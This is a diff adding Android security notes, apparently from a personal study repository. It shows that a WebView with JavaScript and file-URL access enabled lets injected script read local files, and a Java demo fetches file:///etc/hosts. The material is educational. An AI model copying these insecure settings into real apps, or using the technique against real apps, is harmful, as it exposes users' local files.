@@ -18,6 +18,52 @@ jarsigner -verbose -keystore ~/.android/debug.keystore patch.apk androiddebugkey
 
 ~~~
 
+**Notes about webview:**
+~~~
+webview.load(url);
+webview.loadDataWithBaseURL(url, data, "text/HTML", "UTF-8", null);
+if the url uses file:/// then it is possible to use AJAX to access local file system.
+There are 2 requirement for this attack:
+webSettings.setJavaScriptEnabled(true);   // enables javascript
+webSettings.setAllowFileAccessFromFileURLs(true);   // enables file:/// access
+~~~
+
+The following code snippet allows local file access, code also updated in my `HelloWorld` app in the repo.
+
+~~~JAVA
+public void showWebView(View view) {
+    WebView webview = new WebView(this);
+    setContentView(webview);
+    WebSettings webSettings = webview.getSettings();
+    webSettings.setJavaScriptEnabled(true);
+    webSettings.setAllowFileAccessFromFileURLs(true);     // this makes ajax to local file possible
+    webSettings.setAllowContentAccess(true);
+
+
+
+    String data = "<html><body>You scored <b>1337</b> points.<script>document.write(1)" +
+            "</script>\n" +
+            "<script>\n" +
+            "document.write(2);\n" +
+            "var httpRequest;\n" +
+            "makeRequest();\n" +
+            "function makeRequest() {\n" +
+            "  httpRequest = new XMLHttpRequest();\n" +
+            "  httpRequest.onreadystatechange = alertContents;\n" +
+            "  httpRequest.open(\"GET\", \"file:///etc/hosts\");\n" +
+            "  httpRequest.send();\n" +
+            "}\n" +
+            "function alertContents() {\n" +
+            "  if (httpRequest.readyState === XMLHttpRequest.DONE){\n" +
+            "    document.write(httpRequest.responseText)\n" +
+            "  }\n" +
+            "}\n" +
+            "</script>";
+    Log.d(TAG,data);
+    webview.loadDataWithBaseURL("file:///bla/bla/bla", data, "text/HTML", "UTF-8", null);
+}
+~~~
+
 **Little smali Notes**
 
 ~~~
